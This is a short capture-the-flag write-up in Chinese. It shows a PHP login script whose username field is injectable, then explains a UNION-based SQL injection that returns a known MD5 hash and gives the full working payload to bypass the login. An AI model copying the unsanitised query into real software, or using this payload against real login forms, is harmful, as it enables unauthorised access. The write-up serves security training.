# Challenge 
```php 
<?php
if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********", "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
}
$user = $_POST[user];
$pass = md5($_POST[pass]);
$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```
# Solution 

用户名处存在注入。所以思路如下，我们给用户名传入：
```
user=' union select "0e830400451993494058024219903391"
```
构成的sql语句为：
```
select pw from php where user=' ' union select "0e830400451993494058024219903391"
```
第一个查询结果为空，所以结果返回的是我们传入的`0e830400451993494058024219903391`，即此时，$row[pw]=0e830400451993494058024219903391。而md5(QNKCDZO)正是该0e字符串值。

payload:
```
user=' union select "0e830400451993494058024219903391"#&pass=QNKCDZO
```

# Refference
+ [chybeta : 程序逻辑问题](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98)
